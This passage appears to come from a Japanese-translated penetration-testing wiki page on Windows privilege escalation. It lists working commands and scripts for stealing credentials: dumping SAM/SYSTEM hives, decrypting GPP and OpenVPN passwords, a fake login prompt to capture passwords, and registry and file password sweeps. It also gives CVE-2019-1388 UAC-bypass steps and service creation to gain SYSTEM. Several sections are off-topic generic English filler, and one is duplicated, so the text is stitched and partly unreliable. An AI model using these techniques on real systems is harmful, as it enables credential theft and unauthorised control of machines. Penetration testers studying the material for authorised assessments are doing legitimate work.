</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ

Windowsオペレーティングシステムでは、SAM（Security Account Manager）とSYSTEMファイルは非常に重要なファイルです。SAMファイルには、ユーザーアカウントの情報やパスワードのハッシュが格納されており、SYSTEMファイルにはWindowsセキュリティの設定が含まれています。

これらのファイルは通常、C:\Windows\System32\configディレクトリに保存されています。ユーザーが管理者権限を持っている場合、これらのファイルをバックアップすることで、特権昇格攻撃のための重要な情報を入手することができます。

SAMファイルとSYSTEMファイルのバックアップを取得するためには、以下の手順を実行します。

1. バックアップを取得したいマシンにアクセスします。
2. 管理者権限を持つユーザーとしてログインします。
3. コマンドプロンプトを開きます。
4. `copy C:\Windows\System32\config\SAM C:\backup\SAM` コマンドを実行して、SAMファイルをバックアップディレクトリにコピーします。
5. `copy C:\Windows\System32\config\SYSTEM C:\backup\SYSTEM` コマンドを実行して、SYSTEMファイルをバックアップディレクトリにコピーします。

これにより、SAMファイルとSYSTEMファイルのバックアップが取得されます。これらのバックアップは、特権昇格攻撃やパスワードクラッキングなどのセキュリティテストに使用することができます。
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウドの資格情報

Cloud credentials refer to the authentication information used to access and manage cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or other forms of authentication tokens.

In the context of cloud security, it is crucial to protect and manage cloud credentials properly to prevent unauthorized access and potential data breaches. Here are some best practices for handling cloud credentials:

1. **Secure Storage**: Store cloud credentials in a secure location, such as a password manager or a secure file storage system. Avoid storing them in plain text files or sharing them through insecure channels like email.

2. **Strong Passwords**: Use strong, unique passwords for cloud accounts and regularly update them. Avoid reusing passwords across different accounts.

3. **Multi-Factor Authentication (MFA)**: Enable MFA for cloud accounts whenever possible. This adds an extra layer of security by requiring a second form of authentication, such as a code generated by a mobile app or a physical security key.

4. **Least Privilege**: Follow the principle of least privilege when assigning permissions to cloud credentials. Only grant the necessary permissions required for specific tasks or roles, reducing the risk of unauthorized access.

5. **Regular Auditing**: Regularly review and audit cloud credentials to identify any unused or unnecessary credentials. Remove or disable any credentials that are no longer needed.

By implementing these best practices, you can enhance the security of your cloud credentials and reduce the risk of unauthorized access or data breaches.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**というファイルを検索します。

### キャッシュされたGPPパスワード

KB2928120（MS14-025を参照）より前では、一部のグループポリシー設定にカスタムアカウントを使用することができました。この機能は、主に一連のマシンにカスタムのローカル管理者アカウントを展開するために使用されました。ただし、このアプローチには2つの問題がありました。まず、グループポリシーオブジェクトはSYSVOL内のXMLファイルとして保存されているため、ドメインユーザーはそれらを読み取ることができます。2つ目の問題は、これらのGPPに設定されたパスワードがデフォルトの鍵でAES256で暗号化されていることで、このデフォルトの鍵は公に文書化されています。つまり、認証されたユーザーは非常に機密性の高いデータにアクセスし、自分のマシンまたはドメインの特権を昇格させる可能性があります。この機能は、ローカルにキャッシュされたGPPファイルに空でない「cpassword」フィールドが含まれているかどうかを確認します。もしそうであれば、それを復号化し、ファイルの場所とともにGPPに関する情報を含むカスタムのPSオブジェクトを返します。

これらのファイルを検索します：`C:\ProgramData\Microsoft\Group Policy\history`または_**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista以前）_。

**cPasswordを復号化するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する方法:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

The IIS (Internet Information Services) web config file is an important configuration file for managing web applications hosted on Windows servers. It contains settings and directives that control various aspects of the web server and the applications running on it.

#### Location

The web config file is typically located in the root directory of the web application, with the filename `web.config`. It can also be found in subdirectories of the application, allowing for specific configuration settings at different levels.

#### Structure

The web config file is written in XML format and consists of a hierarchical structure. It contains various sections and elements that define settings for different aspects of the web application, such as authentication, authorization, session management, and error handling.

#### Configuration Options

The web config file provides a wide range of configuration options that can be customized to meet the specific requirements of the web application. Some common configuration options include:

- Authentication: Configuring the authentication method used by the web application, such as Windows authentication or forms-based authentication.
- Authorization: Specifying the access control rules for different users or groups, determining who can access specific resources.
- Session Management: Configuring session state options, such as session timeout and session mode.
- Error Handling: Defining how errors and exceptions are handled by the web application, including custom error pages and error logging.
- HTTP Compression: Enabling compression of HTTP responses to optimize bandwidth usage.
- URL Rewriting: Configuring URL rewriting rules to provide user-friendly and search engine-friendly URLs.
- MIME Types: Defining the MIME types for different file extensions, allowing the web server to handle them correctly.

#### Modifying the Web Config

To modify the web config file, you can use a text editor or an integrated development environment (IDE). It is important to make backups of the original file before making any changes, as incorrect modifications can cause issues with the web application.

#### Conclusion

Understanding the structure and options available in the IIS web config file is essential for effectively managing and securing web applications hosted on Windows servers. By customizing the configuration settings, you can optimize the performance, security, and functionality of your web application.
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
以下は、資格情報を含むweb.configの例です:

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

このweb.configファイルには、`DatabaseUsername`と`DatabasePassword`というキーがあり、それぞれの値は`admin`と`password123`です。
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPNの資格情報

To establish a secure connection with an OpenVPN server, you will need the following credentials:

- **Username**: Your unique username provided by the OpenVPN server administrator.
- **Password**: The corresponding password associated with your username.

These credentials are necessary to authenticate and authorize your access to the OpenVPN server. Make sure to keep them confidential and avoid sharing them with unauthorized individuals.

### OpenVPNの資格情報

セキュアな接続を確立するために、OpenVPNサーバーには以下の資格情報が必要です：

- **ユーザー名**：OpenVPNサーバーの管理者から提供される固有のユーザー名。
- **パスワード**：ユーザー名に関連付けられた対応するパスワード。

これらの資格情報は、OpenVPNサーバーへのアクセスを認証および承認するために必要です。機密情報として保持し、権限のない個人と共有しないようにしてください。
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ

ログは、システムやアプリケーションの動作やイベントの記録を保持する重要な情報源です。ログは、セキュリティインシデントの検出やトラブルシューティングに役立ちます。Windowsシステムでは、さまざまなログが使用されます。

以下に、主要なログファイルとその役割を示します。

- **セキュリティログ (Security Log)**: セキュリティイベントの記録に使用されます。ログオンの試行、アカウントのロックアウト、特権の昇格などの情報が含まれます。

- **システムログ (System Log)**: システムの動作に関する情報を記録します。起動、シャットダウン、デバイスのドライバの問題などが含まれます。

- **アプリケーションログ (Application Log)**: アプリケーションの動作に関する情報を記録します。エラーメッセージ、アプリケーションのクラッシュなどが含まれます。

- **セキュリティアウディットログ (Security Audit Log)**: セキュリティ監査イベントの記録に使用されます。ファイルアクセス、オブジェクトの変更、特権の使用などが含まれます。

これらのログは、Windowsイベントビューアを使用して表示および分析することができます。ログの監視と分析は、セキュリティインシデントの早期検出と対応に不可欠です。
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報の要求

常に、ユーザーに自分の資格情報、または別のユーザーの資格情報を入力するように求めることができます（クライアントに直接資格情報を要求することは非常に危険です）。
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

以前に明示的なテキストまたはBase64で**パスワード**が含まれていたと知られているファイル名
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
すべての提案されたファイルを検索します。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### リサイクルビン内の資格情報

Bin内に格納されている資格情報を確認するために、リサイクルビンもチェックする必要があります。

複数のプログラムに保存されたパスワードを**回復**するためには、次のリンクを使用できます：[http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### レジストリ内部

**他の可能なレジストリキーには資格情報が含まれている場合があります**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリからopensshキーを抽出する**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**ChromeやFirefox**に保存されているパスワードが格納されている可能性のあるデータベースを確認する必要があります。\
また、ブラウザの履歴、ブックマーク、お気に入りもチェックして、**パスワードが**そこに保存されているかもしれません。

ブラウザからパスワードを抽出するためのツール:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **COM DLLの上書き**

**Component Object Model (COM)**は、Windowsオペレーティングシステム内に組み込まれた技術であり、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にします。各COMコンポーネントは、クラスID (CLSID) によって**識別**され、各コンポーネントは1つ以上のインターフェースを介して機能を公開します。これらのインターフェースは、インターフェースID (IID) によって識別されます。

COMクラスとインターフェースは、レジストリの**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**および**HKEY\_**_**CLASSES\_**_**ROOT\Interface**に定義されます。このレジストリは、**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**をマージして作成されます。

このレジストリのCLSIDsの中には、**InProcServer32**という子レジストリがあり、これには**DLL**を指す**デフォルト値**と**ThreadingModel**という値が含まれています。ThreadingModelの値は、**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、**Neutral**（スレッドニュートラル）のいずれかです。

![](<../../.gitbook/assets/image (638).png>)

基本的に、実行されるDLLを**上書き**できる場合、別のユーザーによって実行される場合には、特権を**エスカレーション**することができます。

攻撃者がCOMハイジャッキングを永続化のメカニズムとして使用する方法について学ぶには、次を参照してください:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **ファイルとレジストリの中から一般的なパスワードを検索する**

**ファイルの内容を検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**

To search for a file with a certain filename, you can use the `dir` command in the Windows command prompt. The `dir` command allows you to list files and directories in a specified location.

To search for a file with a specific filename, follow these steps:

1. Open the command prompt by pressing `Win + R` and typing `cmd`, then press `Enter`.
2. Navigate to the directory where you want to start the search. You can use the `cd` command to change directories.
3. Use the `dir` command with the `/s` parameter to search recursively through all subdirectories. For example, to search for a file named `example.txt`, you would use the following command:

   ```
   dir /s example.txt
   ```

   This command will search for the file `example.txt` in the current directory and all subdirectories.

4. Wait for the search to complete. The command prompt will display a list of all files matching the specified filename, along with their file paths.

By using the `dir` command with the `/s` parameter, you can easily search for files with a specific filename in Windows.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを検索してキー名とパスワードを探す**

レジストリは、Windowsオペレーティングシステムで重要な情報を保存するためのデータベースです。特に、ユーザーのキー名やパスワードなどの機密情報が格納されています。ローカル特権昇格攻撃の一環として、レジストリを検索してこれらの情報を見つけることができます。

以下のコマンドを使用して、レジストリ内のキー名とパスワードを検索します。

```plaintext
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s
reg query HKLM /f "username" /t REG_SZ /s
reg query HKCU /f "username" /t REG_SZ /s
```

これにより、レジストリ内のキー名やパスワードに関連するエントリが表示されます。これらの情報を使用して、特権昇格攻撃のための追加の情報を収集することができます。

> **注意**: レジストリを検索する際には、慎重に行ってください。不正な目的で使用することは違法です。この技術は、セキュリティ専門家や合法的な目的のためにのみ使用されるべきです。
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は、私が作成した**msf**プラグインです。このプラグインは、被害者の中で資格情報を検索するためのすべてのメタスプロイトのPOSTモジュールを自動的に実行します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するための別の優れたツールです。

ツール[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、PuTTY、WinSCP、FileZilla、SuperPuTTY、およびRDPのようなテキスト形式でこのデータを保存するいくつかのツールの**セッション**、**ユーザー名**、および**パスワード**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## リークしたハンドラ

**SYSTEMとして実行されているプロセスが、完全なアクセス権限で新しいプロセスを開く**（`OpenProcess()`）場合、同じプロセスは**低い特権を持つ新しいプロセス**（`CreateProcess()`）**を作成し、メインプロセスのすべてのオープンハンドルを継承**します。\
その後、**低い特権を持つプロセスに完全なアクセス権限がある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを取得**し、**シェルコードをインジェクト**することができます。\
[**この脆弱性を検出して悪用する方法についての詳細は、こちらの例を読んでください**。](leaked-handle-exploitation.md)\
[**さらに、異なるアクセスレベルで継承されたプロセスとスレッドのオープンハンドラをテストおよび悪用する方法についてのより完全な説明については、こちらの記事を読んでください（完全なアクセスのみではなく）**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## 名前付きパイプクライアントのなりすまし

`パイプ`は、プロセス間の通信とデータ交換に使用できる共有メモリのブロックです。

`名前付きパイプ`は、Windowsの仕組みであり、2つの関連のないプロセスがデータを交換できるようにします。プロセスが2つの異なるネットワーク上にある場合でも、通信が可能です。名前付きパイプは、クライアント/サーバーアーキテクチャと非常に似ており、`名前付きパイプサーバー`と`名前付きパイプクライアント`という概念が存在します。

**クライアントがパイプに書き込むと、パイプを作成したサーバー**は、**SeImpersonate**特権を持っていれば、**クライアントをなりすます**ことができます。その後、**なりすますことができるパイプに書き込む特権プロセスを見つけることができれば**、そのプロセスがパイプに書き込んだ後にそのプロセスをなりすまして特権を昇格させることができるかもしれません。[**この攻撃を実行する方法については、こちらを読んでください**](named-pipe-client-impersonation.md) **または** [**こちら**](./#from-high-integrity-to-system)**を読んでください**.**

**また、次のツールを使用すると、バープのようなツールで名前付きパイプ通信を傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **また、このツールを使用すると、特権昇格を見つけるためにすべてのパイプをリストアップして表示できます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## その他

### **パスワードを監視するためのコマンドラインのモニタリング**

ユーザーとしてシェルを取得すると、スケジュールされたタスクや他のプロセスが実行されている場合、**パスワードをコマンドラインで渡す**ことがあります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態と前の状態を比較し、差異があれば出力します。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 低特権ユーザーからNT\AUTHORITY SYSTEMへの昇格（CVE-2019-1388）/ UACバイパス

もしグラフィカルインターフェースにアクセスできる場合（コンソールまたはRDP経由）かつUACが有効な場合、Microsoft Windowsの一部のバージョンでは、特権のないユーザーからターミナルや他のプロセス（例：「NT\AUTHORITY SYSTEM」）を実行することが可能です。

これにより、特権の昇格とUACのバイパスを同時に行うことができます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリはMicrosoftによって署名され、発行されています。

以下は影響を受けるシステムの一部です：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります：

```
1) HHUPD.EXEファイルを右クリックし、管理者として実行します。

2) UACプロンプトが表示されたら、「詳細を表示」を選択します。

3) 「発行元の証明書情報を表示」をクリックします。

4) システムが脆弱である場合、「発行元」のURLリンクをクリックすると、デフォルトのWebブラウザが表示される場合があります。

5) サイトが完全に読み込まれるのを待ち、[名前を付けて保存]を選択してexplorer.exeウィンドウを表示します。

6) エクスプローラウィンドウのアドレスパスに、cmd.exe、powershell.exe、または他の対話型プロセスを入力します。

7) これで「NT\AUTHORITY SYSTEM」のコマンドプロンプトが表示されます。

8) デスクトップに戻るために、セットアップとUACプロンプトをキャンセルすることを忘れないでください。
```

必要なすべてのファイルと情報は、次のGitHubリポジトリにあります：

https://github.com/jas502n/CVE-2019-1388

## 管理者権限の中から高い完全性レベル/ UACバイパス

**完全性レベルについて学ぶ**ために、これを読んでください：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

次に、**UACとUACバイパスについて学ぶ**ために、これを読んでください：

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **高い完全性レベルからシステムへ**

### **新しいサービス**

既に高い完全性プロセスで実行している場合、**システムへの移行**は新しいサービスを作成して実行するだけで簡単です：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

ハイインテグリティプロセスから、**AlwaysInstallElevatedレジストリエントリを有効に**して、_**.msi**_ ラッパーを使用して逆シェルを**インストール**することができます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法の詳細はこちらを参照してください。](./#alwaysinstallelevated)

### High + SeImpersonate権限からSystemへ

**[ここでコードを見つけることができます](seimpersonate-from-high-to-system.md)**。

### SeDebug + SeImpersonateからFull Token権限へ

これらのトークン権限を持っている場合（おそらく既にハイインテグリティプロセスで見つけることができるでしょう）、SeDebug権限を持つほとんどのプロセス（保護されていないプロセスではない）を**開くことができ**、プロセスのトークンを**コピー**し、そのトークンで**任意のプロセスを作成**することができます。\
この技術を使用すると、通常は**すべてのトークン権限を持つSYSTEMとして実行されているプロセスが選択**されます（はい、すべてのトークン権限を持たないSYSTEMプロセスを見つけることができます）。\
**提案された技術を実行するコードの例はこちらを参照してください。**[**ここでコードを見つけることができます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この技術は、meterpreterが`getsystem`でエスカレーションするために使用されます。この技術は、パイプを作成し、そのパイプに書き込むためにサービスを作成/悪用することで構成されます。その後、パイプクライアント（サービス）のトークンを**`SeImpersonate`**権限を使用して**偽装**することができるようになり、SYSTEM権限を取得することができます。\
名前付きパイプについて[**詳しく学ぶには、こちらを読んでください**](./#named-pipe-client-impersonation)。\
[**ハイインテグリティからSystemに移行する方法の例については、こちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**で実行されている**プロセス**によって**ロード**されている**dllをハイジャック**することができれば、その権限で任意のコードを実行することができます。したがって、Dll Hijackingはこの種の特権エスカレーションにも有用であり、さらに、ハイインテグリティプロセスからは**dllをロードするために使用されるフォルダに書き込み権限**があるため、**はるかに簡単に達成**することができます。\
**Dllハイジャックについて詳しくはこちらを参照してください**[**ここで詳しく学ぶことができます**](dll-hijacking.md)**。**

### **管理者またはネットワークサービスからSystemへ**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICEまたはNETWORK SERVICEからフル特権へ

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル特権エスカレーションベクトルを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスと機密ファイルをチェック（**[**こちらをチェック**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの設定ミスをチェックし、情報を収集（**[**こちらをチェック**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、およびRDPの保存されたセッション情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 資格情報をCredential Managerから抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell ADIDNS/LLMNR/mDNS/NBNSスプーフィングおよび中間者攻撃ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な特権エスカレーションWindows列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の特権エスカレーションの脆弱性を検索します（Watsonのために非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（管理者権限が必要です）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の特権エスカレーションの脆弱性を検索します（VisualStudioを使用してコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ミスコンフィギュレーションを検索するためにホストを列挙します（特権エスカレーションよりも情報収集ツール）（コンパイルする必要があります） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（githubのprecompiled exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- ミスコンフィギュレーションをチェックします（githubの実行可能ファイルが事前にコンパイルされています）。おすすめしません。Win10ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- ミスコンフィギュレーションの可能性をチェックします（pythonのexe）。おすすめしません
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
